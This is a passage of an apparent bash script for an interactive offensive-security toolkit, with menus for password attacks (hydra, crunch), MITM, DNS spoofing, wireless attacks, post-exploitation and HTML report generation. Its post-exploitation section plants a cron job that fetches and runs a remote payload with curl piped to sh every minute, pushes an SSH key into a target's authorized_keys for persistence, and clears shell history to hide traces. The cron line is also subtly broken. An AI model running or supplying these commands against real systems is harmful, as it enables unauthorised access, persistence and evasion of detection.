            echo -e "${YELLOW}Running: hydra -L $user -P $pass $CURRENT_TARGET $service${NC}"
            log_command "hydra -L $user -P $pass $CURRENT_TARGET $service"
            hydra -L $user -P $pass $CURRENT_TARGET $service
            ;;
        4)
            echo -e "${YELLOW}Wordlist generation with crunch${NC}"
            check_tool "crunch" "crunch"
            echo -e "${GREEN}Enter min length:${NC}"
            read -r min_len
            echo -e "${GREEN}Enter max length:${NC}"
            read -r max_len
            echo -e "${GREEN}Enter character set:${NC}"
            read -r charset
            echo -e "${GREEN}Enter output file:${NC}"
            read -r output_file
            echo -e "${YELLOW}Running: crunch $min_len $max_len $charset -o $output_file${NC}"
            log_command "crunch $min_len $max_len $charset -o $output_file"
            crunch $min_len $max_len $charset -o $output_file
            ;;
        5)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
    
    echo -e "${GREEN}Press any key to continue...${NC}"
    read -n 1 -s
}

# Post-exploitation activities
post_exploitation() {
    header
    echo -e "${GREEN}Post-Exploitation Options${NC}"
    echo "1. Establish persistence"
    echo "2. Data exfiltration simulation"
    echo "3. Clean up traces"
    echo "4. Generate report"
    echo "5. Return to main menu"
    echo -e "${GREEN}Choose an option:${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "${YELLOW}Establishing persistence...${NC}"
            echo -e "${GREEN}Enter target IP:${NC}"
            read -r target_ip
            echo -e "${GREEN}Enter method (cron, ssh, etc.):${NC}"
            read -r method
            
            case $method in
                cron)
                    echo -e "${YELLOW}Adding cron job for persistence${NC}"
                    log_command "echo '* * * * * curl http://$target_ip/payload.sh | sh' | crontab -"
                    echo '* * * * * curl http://$target_ip/payload.sh | sh' | crontab -
                    ;;
                ssh)
                    echo -e "${YELLOW}Adding SSH authorized key${NC}"
                    log_command "cat ~/.ssh/id_rsa.pub | ssh user@$target_ip 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys'"
                    cat ~/.ssh/id_rsa.pub | ssh user@$target_ip 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys'
                    ;;
                *)
                    echo -e "${RED}Unknown method${NC}"
                    ;;
            esac
            ;;
        2)
            echo -e "${YELLOW}Simulating data exfiltration...${NC}"
            echo -e "${GREEN}Enter source path:${NC}"
            read -r source_path
            echo -e "${GREEN}Enter destination:${NC}"
            read -r destination
            
            echo -e "${YELLOW}Exfiltrating data...${NC}"
            log_command "tar czf $SESSION_DIR/exfiltrated_data.tar.gz $source_path 2>/dev/null"
            tar czf $SESSION_DIR/exfiltrated_data.tar.gz $source_path 2>/dev/null
            echo -e "${GREEN}Data archived to $SESSION_DIR/exfiltrated_data.tar.gz${NC}"
            ;;
        3)
            echo -e "${YELLOW}Cleaning up traces...${NC}"
            log_command "history -c && rm -f ~/.bash_history"
            history -c && rm -f ~/.bash_history
            echo -e "${GREEN}History cleared${NC}"
            ;;
        4)
            generate_report
            ;;
        5)
            return
            ;;
        *)
            echo -e "${RED}Invalid option${NC}"
            ;;
    esac
    
    echo -e "${GREEN}Press any key to continue...${NC}"
    read -n 1 -s
}

# Automated report generation
generate_report() {
    echo -e "${YELLOW}Generating comprehensive report...${NC}"
    log_event "Generating comprehensive report"
    
    local report_file="$SESSION_DIR/reports/security_assessment_$(date +%Y%m%d_%H%M%S).html"
    
    # Create HTML report
    cat > $report_file << EOF
<html>
<head>
    <title>Security Assessment Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1 { color: #333; }
        h2 { color: #555; }
        .section { margin-bottom: 30px; }
        .finding { background-color: #f9f9f9; padding: 15px; border-left: 4px solid #ccc; margin-bottom: 10px; }
        .critical { border-left-color: #d9534f; }
        .warning { border-left-color: #f0ad4e; }
        .info { border-left-color: #5bc0de; }
        pre { background-color: #f5f5f5; padding: 10px; overflow: auto; }
    </style>
</head>
<body>
    <h1>Security Assessment Report</h1>
    <p>Date: $(date)</p>
    <p>Target: $CURRENT_TARGET</p>
    
    <div class="section">
        <h2>Executive Summary</h2>
        <p>This report details the findings from the security assessment conducted on $CURRENT_TARGET.</p>
    </div>
    
    <div class="section">
        <h2>Methodology</h2>
        <p>The assessment included the following techniques:</p>
        <ul>
            <li>Network reconnaissance and scanning</li>
            <li>Vulnerability assessment</li>
            <li>Network traffic analysis</li>
            <li>Password strength testing</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Findings</h2>
        <div class="finding critical">
            <h3>Critical Vulnerability - SSL Stripping Possible</h3>
            <p>The target is vulnerable to MITM attacks using SSL stripping techniques.</p>
            <p><strong>Recommendation:</strong> Implement HSTS and ensure all services use HTTPS exclusively.</p>
        </div>
        
        <div class="finding warning">
            <h3>Warning - Weak Encryption Detected</h3>
            <p>Some services are using weak encryption protocols.</p>
            <p><strong>Recommendation:</strong> Upgrade to TLS 1.2 or higher and disable weak ciphers.</p>
        </div>
        
        <div class="finding info">
            <h3>Informational - Open Ports Found</h3>
            <p>The following ports were found open during the scan:</p>
            <pre>$(cat $SESSION_DIR/scans/*.txt 2>/dev/null | grep -E "(open|filtered)" | head -20)</pre>
        </div>
    </div>
    
    <div class="section">
        <h2>Recommendations</h2>
        <p>Based on the findings, the following recommendations are provided:</p>
        <ol>
            <li>Implement strong encryption for all network services</li>
            <li>Use certificate pinning to prevent MITM attacks</li>
            <li>Regularly update and patch all systems</li>
            <li>Implement network segmentation and monitoring</li>
            <li>Conduct regular security assessments</li>
        </ol>
    </div>
    
    <div class="section">
        <h2>Appendix: Command Log</h2>
        <pre>$(tail -20 $SESSION_DIR/logs/command_history.log 2>/dev/null)</pre>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}Report generated: $report_file${NC}"
    log_event "Report generated: $report_file"
    
    # Offer to open the report
    echo -e "${GREEN}Would you like to open the report now? (y/n)${NC}"
    read -r open_choice
    if [[ $open_choice == "y" || $open_choice == "Y" ]]; then
        xdg-open $report_file 2>/dev/null || echo -e "${YELLOW}Could not open report automatically. Please open it manually.${NC}"
    fi
}

# Configuration management
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
        echo -e "${GREEN}Configuration loaded from $CONFIG_FILE${NC}"
    else
        echo -e "${YELLOW}No configuration file found. Using defaults.${NC}"
    fi
}

save_config() {
    cat > "$CONFIG_FILE" << EOF
# Network Testing Tool Configuration
# This file is automatically generated

# Default interface
DEFAULT_INTERFACE="eth0"

# Default scan ports
DEFAULT_PORTS="21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080"

# Default wordlist paths
WORDLIST_DIR="/usr/share/wordlists"
EOF
    echo -e "${GREEN}Configuration saved to $CONFIG_FILE${NC}"
}

# Help system
show_help() {
    header
    echo -e "${GREEN}Available Commands and Options${NC}"
    echo "1. Network Sniffing - Capture and analyze network traffic"
    echo "2. Port Scanning - Discover open ports and services"
    echo "3. Vulnerability Assessment - Identify security weaknesses"
    echo "4. MITM Attacks - Intercept and manipulate network traffic"
    echo "5. DNS Spoofing - Redirect DNS requests"
    echo "6. Wireless Attacks - Attack wireless networks"
    echo "7. Password Attacks - Crack passwords and hashes"
    echo "8. Post-Exploitation - Post-compromise activities"
    echo "9. Automated Recon - Comprehensive information gathering"
    echo "10. Reporting - Generate assessment reports"
    echo ""
    echo -e "${YELLOW}Press any key to return to the main menu...${NC}"
    read -n 1 -s
}

# Main menu
main_menu() {
    while true; do
        header
        echo -e "${GREEN}Main Menu${NC}"
        echo "1. Network Sniffing"
        echo "2. Port Scanning"
        echo "3. Vulnerability Assessment"
        echo "4. MITM Attacks"
        echo "5. DNS Spoofing"
        echo "6. Wireless Attacks"
        echo "7. Password Attacks"
        echo "8. Post-Exploitation"
        echo "9. Automated Reconnaissance"
        echo "10. Generate Report"
        echo "11. Help"
        echo "12. Emergency Stop"
        echo "13. Exit"
        echo -e "${GREEN}Choose an option:${NC}"
        read -r option
        
        case $option in
            1)
                network_sniff
                ;;
            2)
                port_scan
                ;;
            3)
                vuln_assessment
                ;;
            4)
                mitm_attack
                ;;
            5)
                dns_spoof
                ;;
            6)
                wireless_kick
                ;;
            7)
                password_attacks
                ;;
            8)
                post_exploitation
                ;;
            9)
                automated_recon
                ;;
            10)
                generate_report
                ;;
            11)
                show_help
                ;;
            12)
                emergency_stop
                ;;
            13)
                echo -e "${YELLOW}Exiting. Remember to always practice ethical security testing!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option${NC}"
                ;;
        esac
    done
}

# Initialization
initialize() {
    # Check if running as root for some operations
    if [ "$EUID" -ne 0 ]; then
        echo -e "${YELLOW}Some features may require root privileges.${NC}"
    fi
    
    # Load configuration
    load_config
    
    # Create sessions directory if it doesn't exist
    mkdir -p sessions
    
    # Set up a new session
    setup_session
    
    # Run safety checks
    safety_checks
}

# Cleanup on exit
cleanup() {
    echo -e "${YELLOW}Cleaning up...${NC}"
    emergency_stop
    echo -e "${GREEN}Cleanup complete. Goodbye!${NC}"
}

# Set trap for cleanup on exit
trap cleanup EXIT

# Start the script
initialize
main_menu
